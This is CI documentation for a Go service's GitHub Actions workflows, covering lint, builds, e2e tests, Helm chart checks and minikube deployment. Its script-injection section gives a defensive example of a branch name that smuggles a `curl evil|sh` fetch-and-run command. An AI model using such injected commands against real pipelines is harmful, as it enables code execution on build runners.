# CI

## Workflow split

CI is split by what changed:

| Workflow | Runs on changes to | Jobs |
|---|---|---|
| [`app-ci.yml`](../.github/workflows/app-ci.yml) | `src/**`, `helm/**` | Go lint, test, [build matrix](#build-matrix), [e2e](#e2e-tests) (incl. [minikube](#minikube-e2e)), secret scan, image scan |
| [`helm-ci.yml`](../.github/workflows/helm-ci.yml) | `helm/**` | [Chart lint](#chart-lint) |

Both also run when their own workflow file or `.github/actions/**` changes, so a CI edit tests itself. App CI also runs on chart changes, because the minikube e2e deploys the in-repo chart. An app-only PR doesn't lint the chart.

Gotcha: a path-filtered workflow that doesn't run leaves its checks pending. If either workflow becomes a required status check, add an always-running gate job, or the filtered PRs can never merge.

## Gather metadata

Every workflow starts with a `metadata` job that checks out the repo and runs [`.github/actions/gather-metadata`](../.github/actions/gather-metadata/action.yml). Downstream jobs read branch, SHA, commit message and trigger reason from its outputs instead of re-deriving them.

| Output | Value |
|---|---|
| `branch` | PR head branch on `pull_request`, branch name on branch pushes, empty on tag pushes |
| `sha` / `short-sha` | Commit being built (see [PR head commit](#pr-head-commit)) |
| `commit-message` | Subject line of that commit (see [Commit message](#commit-message)) |
| `reason` | `github.event_name` |

### Script injection

Values controlled by whoever opens a PR or pushes (`head_ref`, commit messages) are passed to `run:` through `env:` and read as `"$VAR"`. They are never put inline as `${{ ... }}`.

With inline `${{ }}`, Actions substitutes the text into the script before bash runs, so a branch named `` a`curl evil|sh` `` would execute. An environment variable is only data to bash. See GitHub's [security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).

### PR head commit

On `pull_request`, `github.sha` is a temporary merge commit (PR merged into base) that GitHub creates for the run. Nobody pushed it, it isn't on any branch, and a short SHA built from it matches nothing in the PR. The action reports `github.event.pull_request.head.sha` instead, which is the commit the author pushed.

### Commit message

The commit subject comes from `git log` in the checked-out repo, not from the GitHub API. This needs no token or network, and it works under [act](LOCAL-TESTING.md#ci), whose runner image has no `gh` CLI.

On `pull_request`, `actions/checkout` fetches only the merge commit (`fetch-depth: 1`), so the PR head commit is not present locally. In that case the action fetches that one commit (`git fetch --depth=1 origin <sha>`) and then reads it.

## Go lint

The `lint` job runs [golangci-lint](https://golangci-lint.run) in `src/` with [`src/.golangci.yml`](../src/.golangci.yml). Its version is pinned (see [Tool pins](#tool-pins)), so a new linter release can't break CI unannounced. The `e2e` build tag is enabled, so the e2e tests get linted too.

Linters: golangci's `standard` set (`errcheck`, `govet`, `ineffassign`, `staticcheck`, `unused`) plus:

- `gosec`: security issues (file inclusion, missing HTTP timeouts, log injection).
- `errorlint`: wrap errors with `%w`, so callers can use `errors.Is`/`errors.As`.
- `bodyclose`: unclosed HTTP response bodies.
- `misspell`: typos in comments and strings.

`gofmt` runs as a formatter check. To run locally, see [LOCAL-TESTING.md#ci](LOCAL-TESTING.md#ci).

## Tool pins

Every CI tool version lives in one block in [`.github/actions/install-ci-tools`](../.github/actions/install-ci-tools/action.yml). Jobs call it with `suite: app` (Go, golangci-lint), `suite: helm` (helm, kubeconform, kube-linter) or `suite: minikube` (Go, helm, minikube, kubectl). An unknown suite fails fast. One `k8s-version` pin drives kubeconform's schemas, the minikube cluster and kubectl, so they always agree. To bump a tool, change one line there.

The Go version is the exception: it comes from `src/go.mod`, so the toolchain matches the module. Actions themselves (`actions/checkout@v7`, ...) are pinned by major tag where they're used.

## Build matrix

`build` runs once per arch on a native GitHub runner: `ubuntu-latest` for amd64 and `ubuntu-24.04-arm` for arm64. Each leg builds [`src/Dockerfile`](../src/Dockerfile) as `echo-pong:ci` and uploads it as a gzipped `docker save` tarball (artifact `image-<arch>`, kept 1 day).

Native runners keep any target-arch execution (e2e, future scans) unemulated and fast. The Dockerfile itself cross-compiles (see [CONTAINER.md#cross-compile](CONTAINER.md#cross-compile)), so a single-runner `buildx --platform linux/amd64,linux/arm64` build also works. That's the likely shape for the release push.

## E2E tests

[`src/test/e2e`](../src/test/e2e) black-box tests the image. It never imports app code. It only runs the container via the docker CLI and checks exit codes, output and HTTP responses. The `e2e` build tag keeps it out of plain `go test ./...`.

The target is set by env. `E2E_IMAGE` makes the tests start containers themselves. `E2E_BASE_URL` (plus `E2E_SECRET`) points `TestAPI` at an already-running server, and `TestCLI` skips. The same API cases therefore run against a bare container and a [live deploy](#minikube-e2e).

| Suite | Test | Covers |
|---|---|---|
| CLI | `TestCLI` | `--help`, ping/pong, wrong/missing password, missing/unknown command, missing `SECRET_FILE_PATH` |
| API | `TestAPI` | `/health`, `/`, `/ping` and `/pong` with no, wrong, raw and `Bearer` tokens |

The `e2e` job runs once per arch (`fail-fast: false`). It downloads and loads the arch's image artifact once, then runs three suites as [`parallel`](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsparallel) steps, each with its own log:

- `CLI e2e`: `go test -run '^TestCLI$'` against containers.
- `API e2e`: `go test -run '^TestAPI$'` against a container.
- `minikube e2e`: `TestAPI` through the Gateway of a live deploy (see [Minikube e2e](#minikube-e2e)).

The job fails if any suite fails, but only after all three finish.

The secret file goes in with `docker create` + `docker cp`, not a bind mount (see [LOCAL-TESTING.md#e2e](LOCAL-TESTING.md#e2e)). The API suite waits up to 45s for `/health`, because the server sleeps 10s before listening.

## Chart lint

`helm-ci.yml` checks [`helm/echo-pong`](../helm/echo-pong) in three layers:

0. `helm dependency build` fetches the [Envoy Gateway subchart](HELM.md#envoy-gateway) pinned in `Chart.lock`. `helm/*/charts/` is gitignored.
1. `helm lint --strict`: chart structure and templates. Warnings fail too.
2. `helm template --skip-tests` renders the manifests. Test hooks are skipped because they are throwaway pods, not deployed workload, and would otherwise trip the policy below.
3. The rendered output goes through [kubeconform](#kubeconform) (schema) and [kube-linter](#kube-linter-policy) (policy).

### Kubeconform

`kubeconform -strict` validates every rendered object against the Kubernetes OpenAPI schema for the pinned `k8s-version` (see [Tool pins](#tool-pins)). `-strict` rejects unknown fields, so a typo like `readinesProbe` fails instead of being silently dropped. Bump `k8s-version` to match the target cluster's minor version.

CRDs (Gateway API `Gateway`/`HTTPRoute`/`GatewayClass`, Envoy `EnvoyProxy`) aren't in the core schema. A second `-schema-location` points at the [Datree CRDs catalog](https://github.com/datreeio/CRDs-catalog), so they're validated instead of erroring with "could not find schema".

### Kube-linter policy

[`helm/.kube-linter.yaml`](../helm/.kube-linter.yaml) sets `doNotAutoAddDefaults: true` and lists every check explicitly. Each line carries a comment naming the README requirement it enforces, so the policy is the README's requirements made executable, and nothing more.

Two custom checks set the replica floor to 2 (`minimum-two-replicas`, `hpa-minimum-two-replicas`) instead of the built-in 3. Two replicas plus a PDB keep a pod serving through a rolling update or a single node drain. README L59 (registry pull) has no static check. It's covered by deploying, not linting.

## Soft-fail

Temporary: golangci-lint (`app-ci.yml`) and the chart checks (`helm-ci.yml`) run with step-level `continue-on-error: true`. The skeleton PR lands as a smoke test, so `build` and `e2e` run while the existing `main.go` has 11 lint issues and the basic chart doesn't yet meet the kube-linter policy.

Step-level (not job-level) keeps the job green so downstream jobs run, while the failed step still shows in the run log.

To make these checks blocking, remove every `continue-on-error` (`grep -rn continue-on-error .github`) and the TODO comments that link here.

## Minikube e2e

The `minikube e2e` step runs in each arch's [e2e job](#e2e-tests), in parallel with the container suites. It runs `TestAPI` against a live Kubernetes deploy, with traffic entering through the [Gateway](HELM.md#envoy-gateway) the way it would in production.

[`src/test/e2e/minikube-e2e.sh`](../src/test/e2e/minikube-e2e.sh) does the whole flow, locally and in CI:

1. `minikube start` (docker driver, `k8s-version` from [Tool pins](#tool-pins)), then `minikube image load` the CI image.
2. `helm dependency build` the in-repo chart (`CHART_REF` overrides it, e.g. with a released OCI chart).
3. Create the namespace and the [auth Secret](HELM.md#auth-secret) holding a random token. On a kept cluster, the existing token is reused, because the app reads its secret only at startup.
4. `helm upgrade --install --wait` with the CI image and `image.pullPolicy=Never`.
5. Wait for the Gateway to be `Programmed` and the Envoy proxy pods to be ready. The controller creates them after install, so `helm --wait` doesn't cover them.
6. `kubectl port-forward` the Envoy proxy Service, then run `TestAPI` with `E2E_BASE_URL` and `E2E_SECRET`.
7. Delete the cluster on exit (unless `KEEP_CLUSTER=1`).

## Actionlint

[`.github/actionlint.yaml`](../.github/actionlint.yaml) ignores one error in `app-ci.yml`: actionlint 1.7.12 (latest as of 2026-10) predates `parallel:` steps and reports them as steps with no `run`/`uses`. Steps nested inside `parallel:` aren't type-checked until actionlint supports the keyword. Drop the ignore when it does. act doesn't run `parallel:` steps either, so run e2e locally per [LOCAL-TESTING.md#e2e](LOCAL-TESTING.md#e2e).
